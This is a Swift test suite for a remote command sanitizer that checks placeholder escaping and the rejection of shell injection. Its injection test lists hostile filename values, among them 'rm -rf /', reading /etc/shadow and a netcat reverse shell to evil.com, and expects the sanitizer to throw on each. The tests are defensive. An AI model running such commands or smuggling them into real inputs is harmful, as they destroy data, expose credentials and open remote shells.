import Foundation
@testable import SparkleCore
@testable import SparkleFeatures
import Testing

@Suite("Remote Command Sanitizer & Security Tests")
struct RemoteCommandSanitizerTests {
    @Test("Safe substitution replaces placeholders with escaped single-quoted arguments")
    func safePlaceholderSubstitution() throws {
        let template = "systemctl status !"
        let substituted = try RemoteCommandSanitizer.substitutePlaceholders(
            template: template,
            selectedFile: "nginx.service",
            remotePath: "/etc/systemd"
        )
        #expect(substituted == "systemctl status 'nginx.service'")

        let pathTemplate = "ls -la !/"
        let pathSubstituted = try RemoteCommandSanitizer.substitutePlaceholders(
            template: pathTemplate,
            remotePath: "/var/log/nginx"
        )
        #expect(pathSubstituted == "ls -la '/var/log/nginx'")
    }

    @Test("Filenames with spaces and quotes are safely escaped without breakout")
    func spacesAndQuotesEscaped() throws {
        let template = "cat !"
        let substituted = try RemoteCommandSanitizer.substitutePlaceholders(
            template: template,
            selectedFile: "my document with 'quotes' & spaces.txt"
        )
        #expect(substituted == "cat 'my document with '\\''quotes'\\'' & spaces.txt'")
    }

    @Test("Interactive prompts substitute answers and defaults cleanly")
    func interactivePromptsSubstitution() throws {
        let template = "tar -czf !?Archive Name:backup.tar.gz?! !"
        let prompts = RemoteCommandSanitizer.extractPrompts(from: template)
        #expect(prompts.count == 1)
        #expect(prompts.first?.prompt == "Archive Name")
        #expect(prompts.first?.defaultValue == "backup.tar.gz")

        // Using default
        let defaultResult = try RemoteCommandSanitizer.substitutePlaceholders(
            template: template,
            selectedFile: "data",
            promptInputs: [:]
        )
        #expect(defaultResult == "tar -czf 'backup.tar.gz' 'data'")

        // Using custom answer
        let customResult = try RemoteCommandSanitizer.substitutePlaceholders(
            template: template,
            selectedFile: "data",
            promptInputs: ["Archive Name": "release-2026.tar.gz"]
        )
        #expect(customResult == "tar -czf 'release-2026.tar.gz' 'data'")
    }

    @Test("Rejects shell injection attacks in parameters")
    func shellInjectionRejection() {
        let template = "systemctl status !"

        // Semicolon injection
        #expect(throws: AppError.self) {
            _ = try RemoteCommandSanitizer.substitutePlaceholders(
                template: template,
                selectedFile: "nginx; rm -rf /"
            )
        }

        // Chaining && injection
        #expect(throws: AppError.self) {
            _ = try RemoteCommandSanitizer.substitutePlaceholders(
                template: template,
                selectedFile: "nginx && cat /etc/shadow"
            )
        }

        // Pipe injection
        #expect(throws: AppError.self) {
            _ = try RemoteCommandSanitizer.substitutePlaceholders(
                template: template,
                selectedFile: "nginx | nc -e /bin/sh evil.com 4444"
            )
        }

        // Backtick command substitution
        #expect(throws: AppError.self) {
            _ = try RemoteCommandSanitizer.substitutePlaceholders(
                template: template,
                selectedFile: "nginx`id`"
            )
        }

        // $() command substitution
        #expect(throws: AppError.self) {
            _ = try RemoteCommandSanitizer.substitutePlaceholders(
                template: template,
                selectedFile: "nginx$(whoami)"
            )
        }

        // NUL byte injection
        #expect(throws: AppError.self) {
            _ = try RemoteCommandSanitizer.substitutePlaceholders(
                template: "cat !\0evil",
                selectedFile: "foo"
            )
        }
    }

    @Test("Default cross-platform presets are non-empty and well-formed")
    func defaultPresetsSanity() {
        let presets = RemoteCommandPreset.defaultPresets
        #expect(!presets.isEmpty)

        let linuxPresets = presets.filter { $0.targetOS == .linux }
        #expect(linuxPresets.contains(where: { $0.name.contains("systemctl") }))
        #expect(linuxPresets.contains(where: { $0.name.contains("journalctl") }))

        let bsdPresets = presets.filter { $0.targetOS == .bsd }
        #expect(bsdPresets.contains(where: { $0.name.contains("service") }))

        let macOSPresets = presets.filter { $0.targetOS == .macOS }
        #expect(macOSPresets.contains(where: { $0.name.contains("launchctl") }))
    }
}
